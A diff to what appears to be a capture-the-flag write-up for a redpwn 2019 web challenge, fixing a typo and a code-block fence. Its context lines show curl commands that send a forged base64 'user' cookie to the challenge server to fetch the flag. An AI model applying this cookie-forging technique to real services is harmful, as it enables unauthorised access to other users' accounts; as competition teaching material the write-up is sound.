@@ -14,7 +14,7 @@ One for the registration:
 
 ![register](register.png)
 
-One you can access once register, allowing you to publish a ghast:
+One you can access once registered, allowing you to publish a ghast:
 
 ![publish](publish.png)
 
@@ -266,7 +266,8 @@ $ curl -H 'Cookie: user=Z2hhc3Q6OTQ5MjQ' --data '{"name": "sherlockholmes99"}' h
 
 The answer was `Z2hhc3Q6OTQ5NDY`. Use it as user ID and browsing to `api/flag` gave us the flag:
 
-```$ curl -H 'Cookie: user=Z2hhc3Q6OTQ5NDY'  http://chall.2019.redpwn.net:8008/api/flag -v
+```
+$ curl -H 'Cookie: user=Z2hhc3Q6OTQ5NDY'  http://chall.2019.redpwn.net:8008/api/flag -v
 *   Trying 34.223.35.192...
 * TCP_NODELAY set
 * Connected to chall.2019.redpwn.net (34.223.35.192) port 8008 (#0)
